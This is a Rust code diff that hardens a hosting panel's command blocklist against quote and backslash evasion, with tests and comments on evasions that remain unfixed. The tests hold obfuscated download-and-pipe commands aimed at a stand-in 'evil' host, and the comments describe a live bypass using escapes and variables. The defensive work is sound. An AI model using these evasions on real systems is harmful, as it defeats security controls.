@@ -103,7 +103,83 @@ const TERMINAL_BLOCKED_PATTERNS: &[&str] = &[
 /// open dialog, through any interpreter, or by any spelling nobody has enumerated.
 /// A real boundary is a per-site uid or a namespace at spawn time, and it is a
 /// different change from this one.
+///
+/// **The same honest bound applies to every KEYWORD in `BLOCKED_PATTERNS`/
+/// `TERMINAL_BLOCKED_PATTERNS`, not just the two path spellings above — and
+/// it goes deeper than the quote/backslash evasion `normalize_for_blocklist`
+/// closes.** `routes/terminal.rs` filters one COMPLETED LINE at a time
+/// against a REAL, PERSISTENT `bash --restricted` process, so bash's own
+/// state (variables, functions) survives across lines even though this
+/// blocklist has no memory of them. A blocked keyword can be assembled from
+/// pieces with no adjacent literal substring on any single line — verified
+/// live, s445:
+///
+///     X=$'\143url'          (ANSI-C octal escape: bash decodes \143 → 'c';
+///                             normalize_for_blocklist only strips quotes/
+///                             backslashes, it does not decode escapes)
+///     $X --version           (no "curl" substring on THIS line either — X
+///                             was set on the line before, which this
+///                             function never sees)
+///
+/// Both lines pass `is_safe_terminal_command` individually. No per-line
+/// substring check — however the substring is normalized — can see this,
+/// because the danger is in the RELATIONSHIP between two lines, not in
+/// either line's text. This is not a hypothetical: `X=curl; $X --version`
+/// (unobfuscated) already runs in `bash --restricted --norc --noprofile`
+/// today; the ANSI-C form above just avoids the *literal* "curl" substring
+/// the plain form would still trip. Recorded as an open, unfixed item in
+/// `project_dockpanel_tech_debt_p184` rather than patched here: blocking
+/// bare shell-assignment syntax would have real false-positive cost
+/// (`FOO=bar wp cache flush` is a legitimate one-liner) for a mitigation
+/// that still doesn't touch aliases/functions/`source`/`read`, so this is
+/// the same class of "different change" the paragraph above already
+/// concedes for filesystem confinement — egress control scoped to the
+/// terminal's own process tree, or dropping outbound network tools from the
+/// site-terminal's reachable PATH, is the shape of a real fix.
 const _SITE_SHELL_IS_NOT_A_SANDBOX: () = ();
+
+/// Reduce ordinary shell quoting/escaping so keyword-blocklist matching sees
+/// what the shell will actually run, not what was literally typed.
+///
+/// `cu''rl -o /tmp/p http://evil` and `w\get -qO- http://evil` contain no
+/// `curl`/`wget` SUBSTRING, so every check below that does a plain
+/// `lower.contains("curl")` waved them through — but `bash --restricted
+/// --norc --noprofile` (the exact invocation `routes/terminal.rs` spawns)
+/// removes the quotes/backslash before exec, and runs the real binary.
+/// `dockpanel-fanout` s445 reproduced this live against that exact
+/// invocation, and independently against `is_safe_cron_command`'s target
+/// (`bash -c`).
+///
+/// This is deliberately NOT a shell parser — it only deletes quote/backslash
+/// characters, so it can only make MORE things match a keyword, never fewer.
+/// It does not close every evasion of a keyword blocklist against a real,
+/// persistent, Turing-complete shell: ANSI-C escapes (`$'\143url'`),
+/// arithmetic/parameter expansion, and command-name indirection via a shell
+/// variable set on a PRIOR line (`X=cu''rl` then `$X --version` — state a
+/// per-line check cannot see) all still construct `curl` without ever
+/// spelling it as an adjacent literal substring. See
+/// `_SITE_SHELL_IS_NOT_A_SANDBOX` below and
+/// `project_dockpanel_tech_debt_p184` for why that residual class is a
+/// different, architectural change, not a blocklist patch.
+fn normalize_for_blocklist(cmd: &str) -> String {
+    let mut out = String::with_capacity(cmd.len());
+    let mut chars = cmd.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            '\'' | '"' => {} // quote-splitting: cu''rl / "cu"'rl' → curl
+            '\\' => {
+                // Outside single quotes, bash drops the backslash and keeps
+                // the next character literally; mirror that for matching.
+                if let Some(next) = chars.next() {
+                    out.push(next);
+                }
+                // A trailing lone backslash has nothing to escape — drop it.
+            }
+            _ => out.push(c),
+        }
+    }
+    out
+}
 
 /// Check if a command string is safe for cron execution.
 /// Rejects shell metacharacters and dangerous patterns.
@@ -171,7 +247,7 @@ pub fn is_safe_cron_command(cmd: &str) -> bool {
         }
     }
 
-    let lower = cmd.to_lowercase();
+    let lower = normalize_for_blocklist(cmd).to_lowercase();
     !BLOCKED_PATTERNS.iter().any(|b| lower.contains(b))
 }
 
@@ -182,7 +258,7 @@ pub fn is_safe_terminal_command(cmd: &str) -> bool {
         return true; // empty input is fine (just pressing Enter)
     }
 
-    let lower = cmd.to_lowercase();
+    let lower = normalize_for_blocklist(cmd).to_lowercase();
 
     // Check base blocked patterns
     if BLOCKED_PATTERNS.iter().any(|b| lower.contains(b)) {
@@ -249,7 +325,7 @@ pub fn is_suspicious_command(cmd: &str) -> bool {
     if cmd.trim().is_empty() {
         return false;
     }
-    let lower = cmd.to_lowercase();
+    let lower = normalize_for_blocklist(cmd).to_lowercase();
     SUSPICIOUS_PATTERNS.iter().any(|p| lower.contains(p))
 }
 
@@ -359,6 +435,56 @@ mod tests {
         // The documented legitimate case must still work.
         assert!(is_safe_cron_command("backup.sh && verify.sh"));
         assert!(is_safe_cron_command("a && b && c"));
+    }
+
+    /// `dockpanel-fanout` s445 (finder + skeptic, live-reproduced against the
+    /// exact `bash --restricted --norc --noprofile` invocation
+    /// `routes/terminal.rs` spawns): `cu''rl`/`w\get` contain no `curl`/
+    /// `wget` SUBSTRING, so the raw-string blocklist waved them through while
+    /// the shell ran the real binary after quote-removal/backslash-escaping.
+    #[test]
+    fn test_terminal_quote_and_backslash_evasion_rejected() {
+        assert!(!is_safe_terminal_command("cu''rl -o /tmp/p http://evil"));
+        assert!(!is_safe_terminal_command("cu\"\"rl -o /tmp/p http://evil"));
+        assert!(!is_safe_terminal_command("w\\get -qO- http://evil"));
+        assert!(!is_safe_terminal_command("s\\u root"));
+        assert!(!is_safe_terminal_command("'d'o'c'k'e'r' ps"));
+        // The unobfuscated forms must still be rejected too (no regression).
+        assert!(!is_safe_terminal_command("curl -o /tmp/p http://evil"));
+        assert!(!is_safe_terminal_command("wget -qO- http://evil"));
+        // Ordinary quoting for a LEGITIMATE argument must keep working —
+        // this is a substring check either way, so quoting an allowed word
+        // was never what made it allowed.
+        assert!(is_safe_terminal_command("echo 'hello world'"));
+        assert!(is_safe_terminal_command("npm start"));
+    }
+
+    #[test]
+    fn test_cron_quote_and_backslash_evasion_rejected() {
+        assert!(!is_safe_cron_command("cu''rl -o /tmp/p http://evil"));
+        assert!(!is_safe_cron_command("w\\get -qO- http://evil"));
+        assert!(is_safe_cron_command("backup.sh && verify.sh"));
+    }
+
+    #[test]
+    fn test_suspicious_quote_and_backslash_evasion_still_detected() {
+        // The alerting path uses the same raw-substring technique as the
+        // blocklist and was blind to the identical evasion (finder's point:
+        // a bypass that defeats the block ALSO defeats the observation).
+        assert!(is_suspicious_command("s\\u root"));
+        assert!(is_suspicious_command("cu''rl|bash"));
+        // Sanity: the unobfuscated form was already (and must remain) detected.
+        assert!(is_suspicious_command("curl|bash"));
+    }
+
+    #[test]
+    fn test_normalize_for_blocklist() {
+        assert_eq!(normalize_for_blocklist("cu''rl"), "curl");
+        assert_eq!(normalize_for_blocklist("cu\"\"rl"), "curl");
+        assert_eq!(normalize_for_blocklist("w\\get"), "wget");
+        assert_eq!(normalize_for_blocklist("echo 'hi'"), "echo hi");
+        assert_eq!(normalize_for_blocklist("trailing\\"), "trailing");
+        assert_eq!(normalize_for_blocklist("plain text"), "plain text");
     }
 
     #[test]
